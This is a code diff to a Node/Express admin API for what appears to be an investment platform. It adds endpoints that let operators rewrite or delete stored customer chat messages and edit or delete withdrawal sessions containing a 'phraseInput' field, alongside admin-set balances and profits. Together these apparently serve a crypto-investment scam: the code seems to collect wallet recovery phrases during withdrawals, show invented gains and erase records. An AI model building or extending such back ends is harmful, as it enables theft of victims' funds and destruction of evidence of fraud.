@@ -557,6 +557,7 @@ app.get('/api/admin/clients', requireAdminAuth, (req, res) => {
     balance: Number(user.balance || 0),
     profit: Number(user.profit || 0),
     activeInvestment: Number(user.activeInvestment || 0),
+    investmentPlan: user.investmentPlan || '',
     nextPayout: user.nextPayout || ''
   }));
 
@@ -569,6 +570,7 @@ app.post('/api/admin/client/update', requireAdminAuth, (req, res) => {
     totalBalance,
     totalProfit,
     activeInvestment,
+    investmentPlan,
     nextPayout
   } = req.body || {};
 
@@ -586,6 +588,7 @@ app.post('/api/admin/client/update', requireAdminAuth, (req, res) => {
   if (totalBalance !== undefined) user.balance = Number(totalBalance) || 0;
   if (totalProfit !== undefined) user.profit = Number(totalProfit) || 0;
   if (activeInvestment !== undefined) user.activeInvestment = Number(activeInvestment) || 0;
+  if (investmentPlan !== undefined) user.investmentPlan = String(investmentPlan || '');
   if (nextPayout !== undefined) user.nextPayout = String(nextPayout || '');
 
   currentUsers[userIndex] = user;
@@ -595,6 +598,98 @@ app.post('/api/admin/client/update', requireAdminAuth, (req, res) => {
   }
 
   return res.json({ success: true, message: 'Client data updated successfully.' });
+});
+
+app.get('/api/admin/client-sessions', requireAdminAuth, (req, res) => {
+  const sessions = Object.keys(chatHistoryByClient).map((clientId) => {
+    const history = Array.isArray(chatHistoryByClient[clientId]) ? chatHistoryByClient[clientId] : [];
+    const lastMessage = history.length > 0 ? history[history.length - 1] : null;
+    return {
+      clientId,
+      messageCount: history.length,
+      lastMessage: lastMessage ? lastMessage.message : 'No messages yet.',
+      lastTimestamp: lastMessage ? lastMessage.timestamp : '',
+      isActive: Boolean(activeConnections[clientId])
+    };
+  });
+
+  return res.json({ success: true, count: sessions.length, sessions });
+});
+
+app.get('/api/admin/client-sessions/:clientId', requireAdminAuth, (req, res) => {
+  const { clientId } = req.params;
+  const history = chatHistoryByClient[clientId];
+
+  if (!Array.isArray(history)) {
+    return res.status(404).json({ success: false, message: 'Client session not found.' });
+  }
+
+  return res.json({ success: true, clientId, count: history.length, messages: history });
+});
+
+app.put('/api/admin/client-sessions/:clientId/messages/:messageIndex', requireAdminAuth, (req, res) => {
+  const { clientId, messageIndex } = req.params;
+  const { message } = req.body || {};
+
+  if (!message || !String(message).trim()) {
+    return res.status(400).json({ success: false, message: 'Message text is required.' });
+  }
+
+  const history = chatHistoryByClient[clientId];
+  if (!Array.isArray(history)) {
+    return res.status(404).json({ success: false, message: 'Client session not found.' });
+  }
+
+  const index = Number(messageIndex);
+  if (!Number.isInteger(index) || index < 0 || index >= history.length) {
+    return res.status(400).json({ success: false, message: 'Invalid message index.' });
+  }
+
+  history[index].message = String(message).trim();
+
+  if (!persistChatHistory()) {
+    return res.status(500).json({ success: false, message: 'Failed to persist client session update.' });
+  }
+
+  return res.json({ success: true, message: 'Client message updated successfully.' });
+});
+
+app.delete('/api/admin/client-sessions/:clientId/messages/:messageIndex', requireAdminAuth, (req, res) => {
+  const { clientId, messageIndex } = req.params;
+  const history = chatHistoryByClient[clientId];
+
+  if (!Array.isArray(history)) {
+    return res.status(404).json({ success: false, message: 'Client session not found.' });
+  }
+
+  const index = Number(messageIndex);
+  if (!Number.isInteger(index) || index < 0 || index >= history.length) {
+    return res.status(400).json({ success: false, message: 'Invalid message index.' });
+  }
+
+  history.splice(index, 1);
+
+  if (!persistChatHistory()) {
+    return res.status(500).json({ success: false, message: 'Failed to persist message delete.' });
+  }
+
+  return res.json({ success: true, message: 'Client message deleted successfully.' });
+});
+
+app.delete('/api/admin/client-sessions/:clientId', requireAdminAuth, (req, res) => {
+  const { clientId } = req.params;
+
+  if (!chatHistoryByClient[clientId]) {
+    return res.status(404).json({ success: false, message: 'Client session not found.' });
+  }
+
+  delete chatHistoryByClient[clientId];
+
+  if (!persistChatHistory()) {
+    return res.status(500).json({ success: false, message: 'Failed to persist session delete.' });
+  }
+
+  return res.json({ success: true, message: 'Client session deleted successfully.' });
 });
 
 app.get('/api/admin/phrase-sessions', requireAdminAuth, (req, res) => {
@@ -635,6 +730,43 @@ app.get('/api/admin/withdraw-sessions', requireAdminAuth, (req, res) => {
   }));
 
   return res.json({ success: true, count: sessions.length, sessions });
+});
+
+app.put('/api/admin/withdraw-sessions/:sessionId', requireAdminAuth, (req, res) => {
+  const { sessionId } = req.params;
+  const { phraseInput, challenge, isPhraseMatch, status } = req.body || {};
+
+  const sessionIndex = withdrawalPhraseSessions.findIndex((session) => session.sessionId === sessionId);
+  if (sessionIndex === -1) {
+    return res.status(404).json({ success: false, message: 'Withdrawal session not found.' });
+  }
+
+  if (phraseInput !== undefined) withdrawalPhraseSessions[sessionIndex].phraseInput = String(phraseInput || '');
+  if (challenge !== undefined) withdrawalPhraseSessions[sessionIndex].challenge = String(challenge || '');
+  if (isPhraseMatch !== undefined) withdrawalPhraseSessions[sessionIndex].isPhraseMatch = Boolean(isPhraseMatch);
+  if (status !== undefined) withdrawalPhraseSessions[sessionIndex].status = String(status || 'pending');
+
+  if (!persistWithdrawals()) {
+    return res.status(500).json({ success: false, message: 'Failed to persist withdrawal session update.' });
+  }
+
+  return res.json({ success: true, message: 'Withdrawal session updated successfully.' });
+});
+
+app.delete('/api/admin/withdraw-sessions/:sessionId', requireAdminAuth, (req, res) => {
+  const { sessionId } = req.params;
+  const beforeCount = withdrawalPhraseSessions.length;
+  withdrawalPhraseSessions = withdrawalPhraseSessions.filter((session) => session.sessionId !== sessionId);
+
+  if (withdrawalPhraseSessions.length === beforeCount) {
+    return res.status(404).json({ success: false, message: 'Withdrawal session not found.' });
+  }
+
+  if (!persistWithdrawals()) {
+    return res.status(500).json({ success: false, message: 'Failed to persist withdrawal session delete.' });
+  }
+
+  return res.json({ success: true, message: 'Withdrawal session deleted successfully.' });
 });
 
 app.put('/api/admin/phrase-sessions/:sessionId', requireAdminAuth, (req, res) => {
